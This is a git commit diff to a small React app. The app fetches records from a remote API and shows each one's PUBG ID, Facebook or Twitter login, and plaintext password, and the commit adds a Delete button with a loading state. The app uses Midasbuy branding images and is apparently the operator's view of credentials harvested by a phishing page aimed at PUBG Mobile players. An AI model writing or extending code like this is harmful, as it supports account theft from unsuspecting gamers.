dc1e10f1a368b2a110586382597b5b9884995719
Mels <mels.vagharshyan18@gmail.com>
2024-03-26 12:43:06 +0400

    yes

--- src/App.tsx
+++ src/App.tsx
@@ -8,35 +8,42 @@ interface IData {
     pubgId: string;
     login: string;
     password: string;
+    socialSite: string;
+    isLoading: boolean;
   }[];
 }
 
 function App() {
-  const [data, setData] = useState<
-    {
-      _id: string;
-      pubgId: string;
-      login: string;
-      password: string;
-      socialSite: string;
-    }[]
-  >();
+  const [data, setData] = useState<IData["data"]>();
+
   const API = axios.create({ baseURL: "https://pubg-mobile.onrender.com" });
 
   const getInfo = async () => {
     try {
-      const { data } = await API.get<
-        {
-          _id: string;
-          pubgId: string;
-          login: string;
-          password: string;
-          socialSite: string;
-        }[]
-      >("/api/information");
+      const { data } = await API.get<IData["data"]>("/api/information");
       setData(data);
-      console.log(data);
-    } catch (err) {}
+    } catch (err) {
+      console.log(err);
+    }
+  };
+
+  const deleteInfo = async (id: string) => {
+    try {
+      // Create a new array with updated loading state for the clicked item
+      setData((prevData) => {
+        return prevData?.map((item) => {
+          if (item._id === id) {
+            return { ...item, isLoading: true };
+          }
+          return item;
+        });
+      });
+
+      await API.delete(`/api/information/remove/${id}`);
+      getInfo();
+    } catch (err) {
+      console.log(err);
+    }
   };
 
   useEffect(() => {
@@ -53,50 +60,65 @@ function App() {
         margin: "10px",
       }}
     >
-      {data?.map((data) => {
-        return (
-          <div
-            style={{
-              maxWidth: "200px",
-              border: "1px solid cyan",
-              borderRadius: "10px",
-              gap: "5px",
-              padding: "5px",
-            }}
-          >
-            <div style={{ display: "flex", gap: "5px", alignItems: "center" }}>
-              <p style={{ color: "red" }}>Network</p>
-              {data?.socialSite === "fb" ? (
-                <img
-                  width={25}
-                  height={25}
-                  src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png"
-                  alt=""
-                />
-              ) : (
-                <img
-                  width={25}
-                  height={25}
-                  src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png"
-                  alt=""
-                />
-              )}
-            </div>
-            <div style={{ display: "flex", gap: "5px" }}>
-              <p style={{ color: "red" }}>PUBG ID</p>
-              <p>{data?.pubgId}</p>
-            </div>
-            <div style={{ display: "flex", gap: "5px" }}>
-              <p style={{ color: "red" }}>Login</p>
-              <p>{data?.login}</p>
-            </div>
-            <div style={{ display: "flex", gap: "5px" }}>
-              <p style={{ color: "red" }}>Password</p>
-              <p>{data?.password}</p>
-            </div>
+      {data?.map((item) => (
+        <div
+          key={item._id}
+          style={{
+            maxWidth: "200px",
+            border: "1px solid cyan",
+            borderRadius: "10px",
+            gap: "5px",
+            padding: "5px",
+          }}
+        >
+          <div style={{ display: "flex", gap: "5px", alignItems: "center" }}>
+            <p style={{ color: "red" }}>Network</p>
+            {item.socialSite === "fb" ? (
+              <img
+                width={25}
+                height={25}
+                src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png"
+                alt=""
+              />
+            ) : (
+              <img
+                width={25}
+                height={25}
+                src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png"
+                alt=""
+              />
+            )}
           </div>
-        );
-      })}
+          <div style={{ display: "flex", gap: "5px" }}>
+            <p style={{ color: "red" }}>PUBG ID</p>
+            <p>{item.pubgId}</p>
+          </div>
+          <div style={{ display: "flex", gap: "5px" }}>
+            <p style={{ color: "red" }}>Login</p>
+            <p>{item.login}</p>
+          </div>
+          <div style={{ display: "flex", gap: "5px" }}>
+            <p style={{ color: "red" }}>Password</p>
+            <p>{item.password}</p>
+          </div>
+          <button
+            style={{
+              border: "none",
+              backgroundImage: "linear-gradient(120deg, red 0%, #f5576c 100%)",
+              padding: "5px 20px",
+              borderRadius: "6px",
+              color: "white",
+            }}
+            onClick={() => deleteInfo(item._id)}
+            disabled={item.isLoading} // Disable button while loading
+          >
+            {item.isLoading && (
+              <img width={20} src="https://i.gifer.com/ZKZg.gif" alt="" />
+            )}
+            {!item.isLoading && "Delete"}
+          </button>
+        </div>
+      ))}
     </div>
   );
 }
